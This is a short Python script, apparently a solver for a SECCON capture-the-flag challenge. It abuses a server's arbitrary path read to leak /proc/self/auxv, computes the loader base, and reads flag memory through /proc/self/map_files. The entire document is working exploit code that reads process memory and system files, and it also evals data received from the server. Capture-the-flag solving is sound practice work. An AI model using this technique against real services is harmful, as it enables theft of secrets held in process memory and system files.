from ptrlib import *
import os

HOST = os.getenv("SECCON_HOST", "localhost")
PORT = int(os.getenv("SECCON_PORT", "2023"))

def leak(path):
    sock.sendlineafter("path: ", path)
    return eval(sock.recvline().decode())

#sock = Process(["python", "server.py"], cwd="../files")
sock = Socket(HOST, PORT)

auxv = leak("/proc/self/auxv")
ld_base = u64(auxv[0x88:0x90])
#addr_flag = ld_base + 0x37000
addr_flag = ld_base - 0x529000
logger.info("flag: " + hex(addr_flag))

flag = leak(f"/proc/self/map_files/{addr_flag:12x}-{addr_flag+0x1000:12x}")
print(flag.decode())

sock.close()
